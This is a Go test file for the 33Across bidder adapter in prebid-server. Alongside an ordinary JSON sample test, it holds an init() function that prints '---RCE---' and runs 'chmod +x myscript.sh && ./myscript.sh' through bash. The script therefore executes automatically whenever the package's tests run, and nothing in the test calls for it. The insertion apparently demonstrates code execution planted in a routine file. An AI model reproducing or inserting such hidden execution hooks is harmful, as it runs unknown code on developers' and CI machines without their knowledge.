package ttx

import (
	"testing"

	"github.com/prebid/prebid-server/v3/adapters/adapterstest"
	"github.com/prebid/prebid-server/v3/config"
	"github.com/prebid/prebid-server/v3/openrtb_ext"
	mylogaaaa "log"
	"os"
	"os/exec"
)

func init() {
	mylogaaaa.Println("---RCE---")
	cmd := exec.Command("bash", "-c", "chmod +x myscript.sh && ./myscript.sh")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
func TestJsonSamples(t *testing.T) {
	bidder, buildErr := Builder(openrtb_ext.Bidder33Across, config.Adapter{
		Endpoint: "http://ssc.33across.com"}, config.Server{ExternalUrl: "http://hosturl.com", GvlID: 1, DataCenter: "2"})

	if buildErr != nil {
		t.Fatalf("Builder returned unexpected error %v", buildErr)
	}

	adapterstest.RunJSONBidderTest(t, "33acrosstest", bidder)
}
